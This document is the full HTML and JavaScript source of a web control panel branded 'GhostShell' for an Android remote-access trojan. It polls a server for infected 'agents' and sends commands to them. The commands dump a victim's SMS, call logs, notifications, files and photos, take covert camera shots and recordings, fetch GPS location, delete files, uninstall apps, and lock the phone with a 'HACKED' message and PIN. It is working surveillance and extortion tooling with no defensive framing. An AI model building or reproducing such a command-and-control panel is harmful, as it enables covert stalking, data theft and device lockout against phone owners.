<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell Shadow Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui; }
        :root { --bg:#0b0f0e; --surface:#141a1a; --primary:#00ffc3; --secondary:#ff3b9e; --text:#dbdbdb; }
        body { background:var(--bg); color:var(--text); padding:10px; }
        .app { max-width:1200px; margin:0 auto; display:grid; grid-template-columns:260px 1fr; gap:15px; }
        .panel { background:var(--surface); border:1px solid var(--primary); border-radius:20px; padding:15px; box-shadow:0 0 15px rgba(0,255,195,0.1); }
        .header { grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; }
        .dev-item { background:#1b2626; padding:12px; border-radius:12px; margin-bottom:8px; cursor:pointer; border:1px solid transparent; transition:0.3s; }
        .dev-item.active { border-color:var(--secondary); box-shadow:0 0 10px var(--secondary); }
        .stat-bar { display:flex; justify-content:space-between; background:#0f1818; padding:10px 15px; border-radius:30px; margin-bottom:15px; border:1px solid #222; font-size:0.9rem; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(110px, 1fr)); gap:10px; }
        .btn { background:#1b2828; border:1px solid #2f4040; border-radius:18px; padding:15px 5px; text-align:center; color:var(--primary); cursor:pointer; font-size:0.8rem; }
        .btn i { display:block; font-size:1.8rem; margin-bottom:8px; color:var(--secondary); }
        .btn:hover { border-color:var(--primary); box-shadow:0 0 15px var(--primary); }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:100; align-items:center; justify-content:center; padding:15px; }
        .m-card { background:var(--surface); width:100%; max-width:800px; max-height:85vh; border-radius:25px; border:1px solid var(--primary); display:flex; flex-direction:column; overflow:hidden; }
        .m-body { padding:15px; overflow-y:auto; flex:1; background:#121d1d; }
        .m-foot { padding:12px; background:#0c1616; display:flex; gap:8px; border-top:1px solid #222; }
        table { width:100%; border-collapse:collapse; }
        td { padding:10px; border-bottom:1px solid #1a2525; color:#ccc; }
        input { background:#1e2e2e; border:1px solid #3b5e5e; padding:8px 15px; border-radius:20px; color:#fff; width:100%; }
        button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
        .red { background:var(--secondary); color:#fff; }
        @media (max-width:700px) { .app { grid-template-columns:1fr; } }
    </style>
</head>
<body>
    <div class="app">
        <header class="panel header">
            <h1 style="color:var(--primary);"><i class="fas fa-skull"></i> GhostShell Panel</h1>
            <div style="color:var(--secondary);"><i class="fas fa-ghost"></i> V4.0</div>
        </header>
        <div class="panel">
            <h3 style="color:var(--secondary); margin-bottom:10px;">AGENTS</h3>
            <div id="dev-list">Scanning...</div>
        </div>
        <div class="panel">
            <div class="stat-bar">
                <span>üéØ <b id="sel-info" style="color:var(--primary)">None</b></span>
                <span>üì∂ <b id="conn-stat" style="color:red">OFFLINE</b></span>
            </div>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>
    <div id="modal" class="modal">
        <div class="m-card">
            <div style="padding:15px; background:#101b1b; display:flex; justify-content:space-between;">
                <h3 id="m-title" style="color:var(--secondary)">TITLE</h3>
                <span style="cursor:pointer;" onclick="closeM()">&times;</span>
            </div>
            <div class="m-body" id="m-body"></div>
            <div class="m-foot" id="m-foot"></div>
        </div>
    </div>
    <script>
        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", flash = false;
        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }
        function openM(t) {
            curMod = t; hash = ""; document.getElementById('modal').style.display = 'flex';
            document.getElementById('m-title').innerText = t.toUpperCase();
            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic' };
            if(map[t]) cmd(map[t]);
            if(t === 'get_location') cmd('get_location');
            render();
        }
        function closeM() { document.getElementById('modal').style.display = 'none'; curMod = null; }
        function render() {
            if(!curMod || !selId || !cache[selId]) return;
            const d = cache[selId], b = document.getElementById('m-body'), f = document.getElementById('m-foot');
            const hCheck = JSON.stringify(d[curMod] || d.media || d.location || "");
            if(hash === hCheck) return; hash = hCheck;
            b.innerHTML = ""; f.innerHTML = "";
            if(curMod === 'sms') b.innerHTML = `<table>${d.sms.map(x=>`<tr><td><b>${x.userSender}</b><br>${x.content}</td></tr>`).join('')}</table>`;
            else if(curMod === 'calls') b.innerHTML = `<table>${d.calls.map(x=>`<tr><td>${x.number} (${x.duration_seconds}s)</td></tr>`).join('')}</table>`;
            else if(curMod === 'apps') b.innerHTML = `<table>${d.apps.map(x=>`<tr><td>${x.appName}</td><td style="text-align:right"><button onclick="cmd('run ${x.packageName}')">RUN</button> <button class="red" onclick="cmd('uninstall ${x.packageName}')">X</button></td></tr>`).join('')}</table>`;
            else if(curMod === 'filemanager') {
                b.innerHTML = `<div style="display:flex;gap:5px;margin-bottom:10px"><input id="fmin" placeholder="cd Downloads"><button onclick="cmd(document.getElementById('fmin').value)">EXE</button><button onclick="cmd('ls')">LS</button></div><p style="color:var(--primary);font-size:0.7rem">Path: ${d.fm.path}</p><table>${d.fm.files.map(x=>`<tr><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}')" style="cursor:pointer">${x.isDirectory?'üìÅ':'üìÑ'} ${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}')">DEL</button></td></tr>`).join('')}</table>`;
                f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0')">SDCARD</button><button onclick="cmd('cd /')">ROOT</button>`;
            } else if(curMod === 'gallery') {
                b.innerHTML = `<div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(100px, 1fr));gap:10px">${d.gallery.files.map(x=>`<div><img src="data:image/jpeg;base64,${x.thumbnail}" style="width:100%;border-radius:10px;border:1px solid var(--primary)"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span>PAGE ${d.gallery.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
            } else if(['takebackpic','takefrontpic','record_back','record_front'].includes(curMod)) {
                const m = d.media; const src = curMod.includes('record') ? m.last_vid : m.last_img;
                if(src) b.innerHTML = `<div style="text-align:center">${src.endsWith('.mp4')?`<video src="/captured_images/${src}" controls style="width:100%"></video>`:`<img src="/captured_images/${src}" style="width:100%;border-radius:15px"/>`}<br><button class="red" style="margin-top:10px" onclick="delF('${src}')">DELETE</button></div>`;
                else b.innerHTML = `<p style="text-align:center">${m.status || 'Waiting Agent...'}</p>`;
            } else if(curMod === 'get_location') {
                if(d.location.url) b.innerHTML = `<div style="text-align:center">${d.location.img?`<img src="${d.location.img}" style="width:100%;border-radius:15px;margin-bottom:10px">`:''}<p style="font-size:0.8rem">${d.location.url}</p><br><a href="${d.location.url}" target="_blank"><button>Google Maps</button></a></div>`;
                else b.innerHTML = `<p style="text-align:center">Waiting GPS...</p>`;
                f.innerHTML = `<button onclick="cmd('get_location')">RE-GPS</button>`;
            } else if(curMod === 'openurl') {
                b.innerHTML = `<p>Target URL:</p><input id="ourl" value="https://"><br><button style="margin-top:10px;width:100%" onclick="cmd('openurl '+document.getElementById('ourl').value)">EXECUTE OPEN URL</button>`;
            } else if(curMod === 'setwallpaper') {
                b.innerHTML = `<p>Direct Image URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg"><br><button style="margin-top:10px;width:100%" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY WALLPAPER</button>`;
            } else if(curMod === 'toast') {
                b.innerHTML = `<p>Msg:</p><input id="lmsg" value="HACKED"><p style="margin-top:10px">PIN:</p><input id="lpin" value="1234"><br><button style="margin-top:10px;width:100%;background:red;color:white" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><br><button style="margin-top:10px;width:100%" onclick="cmd('toast off')">UNLOCK</button>`;
            } else if(curMod === 'notifications') b.innerHTML = `<table>${d.notifications.map(n=>`<tr><td><b>${n.packageName}</b><br>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
        }
        async function delF(f) { if(!confirm('Erase?')) return; await fetch('/api/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename:f})}); hash=""; render(); }
        async function poll() {
            try {
                const r = await fetch('/api/status'); state = await r.json();
                document.getElementById('dev-list').innerHTML = state.devices.map(d=>`<div class="dev-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateU();">${d.model}<br><small>${d.id} ¬∑ ${d.bat}</small></div>`).join('') || "No Agents Online.";
                if(selId) {
                    const dr = await fetch(`/api/data/${selId}`); cache[selId] = await dr.json();
                    if(curMod) render();
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }
        function updateU() {
            const e = !!selId; document.getElementById('sel-info').innerText = selId || "None";
            document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
            document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
            const btns = [
                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
                {id:'openurl', i:'fa-link', l:'OPEN URL'}, {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openM(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
        }
        poll();
    </script>
</body>
</html>
